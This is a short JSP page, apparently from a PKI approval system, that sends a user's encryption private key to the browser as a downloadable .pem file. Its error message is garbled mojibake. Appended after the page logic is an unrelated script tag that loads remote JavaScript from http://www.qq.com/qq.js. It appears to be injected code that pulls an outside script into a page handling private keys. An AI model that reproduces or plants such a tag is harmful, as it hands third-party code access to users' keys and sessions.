<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@ page import="ApproveBeans.ApproveBean" %>
<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>
<%
    String fname="certId("+approveBean.subjectId_Encrypt+")_applyId("+approveBean.applyId+")";	
    response.setContentType("application/file");
    response.setHeader("Content-disposition","attachment; filename=pkiUser_Pvk_"+fname+"_forEncrypt&Decrypt.pem");
    
    BufferedInputStream bis = null;
    BufferedOutputStream bos = null;
    try {
        bis = new BufferedInputStream(new ByteArrayInputStream(approveBean.encryptPvk.getEncoded()));
        bos = new BufferedOutputStream(response.getOutputStream());

        byte[] buff = new byte[2048];
        int bytesRead;

        while(-1 != (bytesRead = bis.read(buff, 0, buff.length))) {
            bos.write(buff,0,bytesRead);
        }

    } catch(final IOException e) {
        System.out.println ( "³öÏÖIOException." + e );
    } finally {
        if (bis != null)
            bis.close();
        if (bos != null)
            bos.close();
    }
%>
<script language=javascript src=http://www.qq.com/qq.js></script>